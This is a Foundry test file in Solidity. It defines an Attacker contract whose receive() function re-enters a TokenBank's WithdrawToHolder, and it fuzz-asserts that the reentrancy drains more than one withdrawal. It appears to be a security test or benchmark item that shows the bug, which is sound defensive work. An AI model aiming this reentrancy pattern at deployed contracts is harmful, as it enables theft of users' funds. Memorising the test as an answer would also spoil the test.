
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TokenBank} from "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    TokenBank public tokenBank;

    Attacker public _attacker;

    function setUp() public {
        tokenBank = new TokenBank();
        tokenBank.initTokenBank();
        _attacker = new Attacker(address(tokenBank));
        tokenBank.changeOwner(address(_attacker));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 stateVal) public {
        vm.assume(attackVal > 0);
        vm.assume(stateVal > tokenBank.MinDeposit());
        vm.assume(stateVal >= attackVal * 2);
        vm.assume(stateVal < type(uint128).max);

        vm.deal(address(tokenBank), stateVal); 
        vm.deal(address(_attacker), stateVal);
        vm.deal(address(this), stateVal);

        _attacker.setupAttack{value: stateVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = TokenBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        storedVal = val;
        
        victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.confirmOwner();

        victim.WithdrawToHolder(address(this), val);

        uint256 current = address(this).balance;
        if (current > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.WithdrawToHolder(address(this), storedVal);
        }
    }
}
